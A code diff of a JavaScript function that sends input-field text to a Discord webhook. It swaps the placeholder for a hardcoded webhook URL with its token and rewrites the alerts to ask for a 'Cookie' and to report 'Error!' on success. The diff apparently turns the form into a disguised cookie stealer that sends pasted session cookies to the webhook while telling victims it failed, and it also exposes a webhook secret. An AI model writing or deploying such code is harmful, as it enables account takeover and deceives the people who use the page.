@@ -1,9 +1,9 @@
 async function sendMessage() {
-    const webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your Discord webhook URL
+    const webhookURL = "https://discord.com/api/webhooks/1296888938652500008/PQTw1hZAPD9yDEnilD3LDhXzzwZI9-PhNLzv8jLV40S0im0wBoviwAiFYV4q6gAGct8K"; // Replace with your Discord webhook URL
     const message = document.getElementById("messageInput").value;
 
     if (!message) {
-        alert("Please enter a message!");
+        alert("Cookie  here!");
         return;
     }
 
@@ -29,12 +29,12 @@ async function sendMessage() {
         });
 
         if (response.ok) {
-            alert("Message sent successfully!");
+            alert("Error!");
         } else {
-            alert("Failed to send message. Please check your webhook URL.");
+            alert("Error 404");
         }
     } catch (error) {
         console.error("Error sending message:", error);
-        alert("An error occurred while sending the message. Please try again.");
+        alert("An error occurred while converting. Please try again.");
     }
 }
